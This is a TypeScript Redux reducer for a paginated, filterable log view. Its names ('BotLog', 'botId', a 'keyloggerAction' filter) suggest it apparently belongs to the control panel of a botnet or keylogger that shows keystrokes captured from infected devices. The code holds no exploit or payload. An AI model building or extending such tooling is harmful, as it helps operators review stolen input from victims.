import {
    CHANGE_LOGS_FILTERS,
    CHANGE_LOGS_SORT,
    ChangeLogsFiltersPayload,
    ChangeLogsSortPayload,
    DELETE_LOGS,
    DeleteLogsPayload,
    EDIT_LOG_COMMENT,
    EditLogCommentPayload,
    FETCH_LOGS,
    GetLogsPayload,
    LogsActionTypes,
    LogsState,
    SET_LOGS_PAGE,
    SetLogsPagePayload,
} from "./Types";
import {BotLog} from "../../Model/BotLog";

const initialState: LogsState = {
    logs: [],
    page: 1,
    total: 0,
    per_page: 16,
    isLoaded: false,
    type: null,
    application: null,
    botId: null,
    filters: {
        application: "",
        query: "",
        keyloggerAction: "[TEXT_CHANGED]",
    },
    sort: {
        field: "created_at",
        by: "descend",
    },
    loaded_page: 0,
    loaded_per_page: 0,
};

const getLogs = (state: LogsState, payload: GetLogsPayload): LogsState => {
    return {
        ...state,
        ...payload,
        isLoaded: true,
        type: payload.type,
    };
};

const deleteLogs = (state: LogsState, payload: DeleteLogsPayload): LogsState => {
    const logs = state.logs.filter((log: BotLog) => !payload.logIds.includes(log.id));

    return {
        ...state,
        logs: logs,
    };
};

export const editComments = (state: LogsState, payload: EditLogCommentPayload): LogsState => {
    const logs = state.logs.map((log: BotLog) => {
        if (payload.logIds.includes(log.id)) {
            return {
                ...log,
                comment: payload.comment,
            };
        }
        return log;
    });

    return {
        ...state,
        logs: logs,
    };
};

const setPage = (state: LogsState, payload: SetLogsPagePayload): LogsState => {
    return {
        ...state,
        page: payload.page,
        per_page: payload.size,
    };
};

const changeFilters = (state: LogsState, payload: ChangeLogsFiltersPayload): LogsState => {
    return {
        ...state,
        filters: {
            ...state.filters,
            ...payload,
        },
        page: 1,
        isLoaded: false,
    };
};

const changeSort = (state: LogsState, payload: ChangeLogsSortPayload): LogsState => {
    return {
        ...state,
        sort: {
            ...state.sort,
            ...payload,
        },
        page: 1,
        isLoaded: false,
    };
};


const LogsReducer = (state: LogsState = initialState, action: LogsActionTypes): LogsState => {
    switch (action.type) {
    case FETCH_LOGS:
        return getLogs(state, action.payload);
    case DELETE_LOGS:
        return deleteLogs(state, action.payload);
    case EDIT_LOG_COMMENT:
        return editComments(state, action.payload);
    case SET_LOGS_PAGE:
        return setPage(state, action.payload);
    case CHANGE_LOGS_FILTERS:
        return changeFilters(state, action.payload);
    case CHANGE_LOGS_SORT:
        return changeSort(state, action.payload);
    default:
        return state;
    }
};

export default LogsReducer;
